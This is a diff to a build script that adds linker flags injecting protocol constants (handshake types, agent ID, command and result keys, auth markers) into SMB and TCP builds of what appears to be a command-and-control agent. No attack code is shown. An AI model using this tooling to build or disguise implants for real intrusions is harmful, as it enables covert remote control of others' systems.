@@ -310,6 +310,23 @@ build_binary() {
             -X 'main.jfCT2=${JF_CT2}' \
             -X 'main.jfET=${JF_ET}' \
             -X 'main.jfMD=${JF_MD}' \
+            -X 'main.protoTypeHandshake=${PROTO_TYPE_HANDSHAKE}' \
+            -X 'main.protoTypeHsResp=${PROTO_TYPE_HS_RESP}' \
+            -X 'main.protoTypePing=${PROTO_TYPE_PING}' \
+            -X 'main.protoTypePong=${PROTO_TYPE_PONG}' \
+            -X 'main.protoTypeData=${PROTO_TYPE_DATA}' \
+            -X 'main.protoTypeDisconnect=${PROTO_TYPE_DISCONNECT}' \
+            -X 'main.protoTypeLinkHsResp=${PROTO_TYPE_LINK_HS}' \
+            -X 'main.protoKeyType=${PROTO_KEY_TYPE}' \
+            -X 'main.protoKeyPayload=${PROTO_KEY_PAYLOAD}' \
+            -X 'main.protoKeyAgentId=${PROTO_KEY_AGENT_ID}' \
+            -X 'main.protoKeyResults=${PROTO_KEY_RESULTS}' \
+            -X 'main.protoKeyCommands=${PROTO_KEY_COMMANDS}' \
+            -X 'main.protoKeySr=${PROTO_KEY_SR}' \
+            -X 'main.protoAuthPrefix=${PROTO_AUTH_PREFIX}' \
+            -X 'main.protoAuthOk=${PROTO_AUTH_OK}' \
+            -X 'main.protoMetaStartup=${PROTO_META_STARTUP}' \
+            -X 'main.protoMetaActive=${PROTO_META_ACTIVE}' \
             ${SMB_FLAGS} \
             ${SAFETY_FLAGS}" \
             -trimpath -o "/output/${OUTPUT_FILENAME}"
@@ -360,6 +377,23 @@ build_binary() {
             -X 'main.jfCT2=${JF_CT2}' \
             -X 'main.jfET=${JF_ET}' \
             -X 'main.jfMD=${JF_MD}' \
+            -X 'main.protoTypeHandshake=${PROTO_TYPE_HANDSHAKE}' \
+            -X 'main.protoTypeHsResp=${PROTO_TYPE_HS_RESP}' \
+            -X 'main.protoTypePing=${PROTO_TYPE_PING}' \
+            -X 'main.protoTypePong=${PROTO_TYPE_PONG}' \
+            -X 'main.protoTypeData=${PROTO_TYPE_DATA}' \
+            -X 'main.protoTypeDisconnect=${PROTO_TYPE_DISCONNECT}' \
+            -X 'main.protoTypeLinkHsResp=${PROTO_TYPE_LINK_HS}' \
+            -X 'main.protoKeyType=${PROTO_KEY_TYPE}' \
+            -X 'main.protoKeyPayload=${PROTO_KEY_PAYLOAD}' \
+            -X 'main.protoKeyAgentId=${PROTO_KEY_AGENT_ID}' \
+            -X 'main.protoKeyResults=${PROTO_KEY_RESULTS}' \
+            -X 'main.protoKeyCommands=${PROTO_KEY_COMMANDS}' \
+            -X 'main.protoKeySr=${PROTO_KEY_SR}' \
+            -X 'main.protoAuthPrefix=${PROTO_AUTH_PREFIX}' \
+            -X 'main.protoAuthOk=${PROTO_AUTH_OK}' \
+            -X 'main.protoMetaStartup=${PROTO_META_STARTUP}' \
+            -X 'main.protoMetaActive=${PROTO_META_ACTIVE}' \
             ${TCP_FLAGS} \
             ${SAFETY_FLAGS}" \
             -trimpath -o "/output/${OUTPUT_FILENAME}"
